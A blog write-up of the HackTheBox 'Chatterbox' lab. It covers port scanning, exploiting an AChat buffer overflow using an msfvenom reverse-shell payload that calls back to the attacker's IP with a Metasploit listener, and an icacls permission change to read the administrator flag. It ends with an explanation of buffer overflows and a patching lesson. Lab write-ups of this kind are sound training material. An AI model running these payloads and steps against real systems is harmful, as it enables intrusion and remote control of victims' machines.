---
layout: post
title: 'HackTheBox - Chatterbox'
date: 2018-06-23
author: Casey Mullineaux
cover: '/images/htb/chatterbox/chatterbox.jpg'
tags: hackthebox
---

Patching your operating system isn't enough. You need to patch your third-party applications too as they can contain vulnerabilities such as **buffer overflows** that allow a system to be exploited.

# Hacking the box

1. [Enumeration](#enum)
2. [Exploitation](#exploit)
3. [Privilege escalation](#privesc)
4. [Deconstructing the hack](#deconstruct)

# <a name="enum"></a> Enumeration
First step as always, is to see what we can discover with an nmap scan
```bash
root@kali:~/htb/chatterbox# nmap -sC -sV -oA chatterbox 10.10.10.74
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-22 18:45 AEST
Nmap scan report for 10.10.10.74
Host is up (0.35s latency).
All 1000 scanned ports on 10.10.10.74 are filtered

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                 
Nmap done: 1 IP address (1 host up) scanned in 352.22 seconds
```

No hits in the top 1000 ports. Time to ..
<p align="center">
    <img src="https://memegenerator.net/img/instances/48937986/scan-all-the-things.jpg">
</p>

Since I'm scanning such a large range of ports, I want to do it quickly. I change the nmap command to skip the thoroughness (`-sV` & `-sC`) in favour of speed. I add the `sS` switch to perform a SYN (or half-open) scan. This helps, as the scan will send the SYN packet and wait for the ACK response to see if the port is open. It won't complete the second half of the three-way handshake, which saves us time. At this stage, we just want to know what ports respond. We'll dig into more detail once we can run targeted scans on a specific list of listening ports. I also add `Pn` (treat all hosts as up), `-p-` to scan all ports, and finally `T5` to use a higher timing template (higher number is faster).

```bash
root@kali:~/htb/chatterbox# nmap -sS -T5 -Pn -p- -oA chatterbox-quick 10.10.10.74   
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-23 06:07 AEST
Warning: 10.10.10.74 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.74
Host is up (0.39s latency).
Skipping host 10.10.10.74 due to host timeout
Nmap done: 1 IP address (1 host up) scanned in 900.18 seconds
root@kali:~/htb/chatterbox# 
```

Hmm .. nmap is timing out. This could either be because my connection sucks, the box is being hammered by other hackers, or it could possibly be intentional. So knowing my phat pipes are a little less phat to this box, I decided to break down the nmap scan to 2000 port chunks. It took a little while, but I finally got some results when scanning the 8000-10000 port range.

```bash
root@kali:~/htb/chatterbox/nmap# nmap -sS -Pn -T5 -p 8000-10000 10.10.10.74
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-22 18:21 AEST
Nmap scan report for 10.10.10.74
Host is up (0.38s latency).
Not shown: 1999 filtered ports
PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
9256/tcp open  achat   AChat chat system
                                         
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 871.22 seconds   
```
<p align="center">
    <img src="https://media.giphy.com/media/3ohs7O2afIz1a8bWPm/giphy.gif">
</p>

Nmap shows that ports `9255` and `9256` relate to something called **AChat**, so I do a quick search for exploits.
```bash
root@kali:~/htb/chatterbox# searchsploit achat
--------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                         |  Path
                                                                                       | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------- ----------------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                             | exploits/windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                | exploits/windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                   | exploits/php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                     | exploits/php/webapps/24647.txt
--------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
root@kali:~/htb/chatterbox# 
```

Look like I'm dealing with a buffer overflow vulnerability.

# <a name="exploitat"></a> Exploitation
A grab a copy of the buffer overflow exploit to my local directory and open it up in VSCode to take a look
```bash
root@kali:~/htb/chatterbox# searchsploit -m exploits/windows/remote/36025.py
  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/36025/
     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /root/htb/chatterbox/36025.py

root@kali:~/htb/chatterbox# code 36025.py
```

![htb-chatterbox-01a](/images/htb/chatterbox/htb-chatterbox-01a.png)

Within the comments of the code, it shows that it's an `msfvenom` generated payload used to execute calc.exe. It's also worth noting everything after the `-b` switch, as this indicates the bad characters I need to make sure I exclude from my payload.
```bash
# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

#Payload size: 512 bytes
```

I just copy and paste the example in the script file and substitute the values I need. 
The example uses `msfvenom` to generate the shellcode to execute on the remote system once the buffer has been overflowed.

I specify `windows/shell/reverse_tcp` as the payload, the encoding type, and also the bad characters to exclude as noted before. Finally, I punch in the IP address and port of my local machine in the `LHOST` and `LPORT` parameters so the reverse shell will reach back to me once executed on the remote system. 

```bash
root@kali:~/htb/chatterbox# msfvenom -p windows/shell/reverse_tcp -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python LHOST=10.10.14.63 LPORT=9001 > toteslegit
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 808 (iteration=0)
x86/unicode_mixed chosen with final size 808
Payload size: 808 bytes
Final size of python file: 3872 bytes
```

Why port 9001? Because ...
<p align="center">
    <img src="https://media.giphy.com/media/ejfQbLsh2rFfi/giphy.gif">
</p>

Back in vscode, I replace the buffer shellcode with what was generated by msfvenom
I also update the value of the remote server to the IP address of Chatterbox.
![htb-chatterbox-01](/images/htb/chatterbox/htb-chatterbox-01.png)

Next, I fire up `metasploit` and configure a listener to receive the connection for when I execute the payload.
```bash
root@kali:~/htb/chatterbox# msfconsole
msf > use exploit/multi/handler 
msf exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.14.63
LHOST => 10.10.14.63
msf exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.63:9001 
```

Finally, I execute **fire mah layzor!~!**
<p align="center">
    <img src="https://media.giphy.com/media/wOk3a0sDqGkdq/giphy.gif">
</p>

![htb-chatterbox-02](/images/htb/chatterbox/htb-chatterbox-02.png)

<div class="alert alert-success">User flag obtained!</div>

# <a name="privesc"></a> Privilege escalation
As the `Alfred` user, I perform some enumeration of the system. After a little bit of time, I figure out that I can to browse to the desktop of the Administrator user, however, I'm unable to read the contents of the flag.
```cmd
Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of c:\Users\Administrator\Desktop

12/10/2017  07:50 PM    <DIR>          .
12/10/2017  07:50 PM    <DIR>          ..
12/10/2017  07:50 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  17,761,198,080 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
Access is denied.

c:\Users\Administrator\Desktop>
```

In normal circumstances, the access control list (ACL) on the Administrator's home folder should prevent any other user from accessing the directory. Considering I'm able to browse there, something has been changed.

Using the `icacls` command, I check the ACLs on the **Administrator's** home folder and confirm that the **Alfred** user has been granted access.
```cmd
c:\Users\Administrator\Desktop>icacls C:\Users\Administrator
cacls C:\Users\Administrator
C:\Users\Administrator NT AUTHORITY\SYSTEM:(OI)(CI)F 
                       CHATTERBOX\Administrator:(OI)(CI)F 
                       BUILTIN\Administrators:(OI)(CI)F 
                       **CHATTERBOX\Alfred:(OI)(CI)F **
```

Looking at the [Microsoft documentation for icals](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) I confirm that **Alfred** has *full control* (`F`) to the directory, and these permissions will be inherited by both objects (files) and containers (directories) within that folder, indicated by `OI` and `CI` respectively.

So what's that mean? **Alfred** has full read/write permissions to all files/folders within the Administrator directory. So why can't I read the root flag? Let's see...

```cmd
c:\Users\Administrator\Desktop>icacls root.txt
icacls root.txt
root.txt CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files
```

For this one specific file, the inherited permissions have been overwritten by explicit ones. This means any permissions set on the parent folder will be ignored for this file. 

Nice try sysadmin, but no cigar. Since we own the parent folder, we can simply change the permissions. Using `icalcs` again, I grant **Alfred** read permissions to root.txt
```cmd
C:\Users\Administrator\Desktop>icacls root.txt /grant Alfred:R
icacls root.txt /grant Alfred:R
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files
```

Now I try reading the file again
```cmd
c:\Users\Administrator\Desktop>type root.txt
type root.txt
**[REDACTED]**
```

<div class="alert alert-success">root flag obtained!</div>

<p align="center">
    <img src="https://media.giphy.com/media/nXxOjZrbnbRxS/giphy.gif">
</p>

# <a name="deconstruct"></a>Deconstructing the hack
The vulnerability that was exploited in this challenge was a **buffer overflow** vulnerability that existed in the AChat application.

The concept of buffer overflow is a very complicated topic and even more difficult to explain, but I'll do my best.

Basically, buffers are areas of memory set aside to hold data. They are most often used by applications to move data from one section of a program to another, or even between programs. Buffer overflows are usually triggered by inputting data into the application that exceeds the size of the buffer that was set aside in memory. The parts of the input that exceeds the buffer size will *overflow* into adjacent parts of memory, hence the term buffer overflow.

So let's say for the sake of simplicity, you're an application developer that's writing an app that accepts credit card information. You create an input field on your form for the user to input a credit card, and you define your buffer to hold 16 digits of data - the length of a credit card number. Credit card numbers aren't variable in length, they're always 16 digits, so this makes sense in order to conserve system resources. But what if I enter 17 digits? Or 100 digits? If the developer doesn't *handle* the invalid input correctly, I've overflowed the buffer by the extra digits into an adjacent area of memory, and the program will most likely crash.

So why is this important? Because on many systems, the memory layout of a program, or the system as a whole, is well defined. By sending data designed to cause a buffer overflow, it is possible to write into areas known to hold executable code and replace it with malicious code. This is what happened with the vulnerability in the AChat application.

The python script did all the hard work. The creator of the script has identified the location in memory where the buffer for AChat was stored, and also all the additional bytes of adjacent read only memory. By overflowing the buffer with just the right amount of data, we can skip over all the read-only memory, and end up in executable memory. This is where our payload lands and is then executed by the system.

---

The important thing to take away here is that it not just an operating system that can contain a vulnerability that allows a bad actor access to your system. Applications too can have a vulnerability that leads to a system being compromised. This is why it is important to listen to your system administrators when they tell you that you need to patch third-party applications like java or flash.

<p class="info">Patching your operating system simply isn't enough. You can have an excellent patching regime for your systems, however, if you're not patching third-party apps too, then the job is only half done.</p>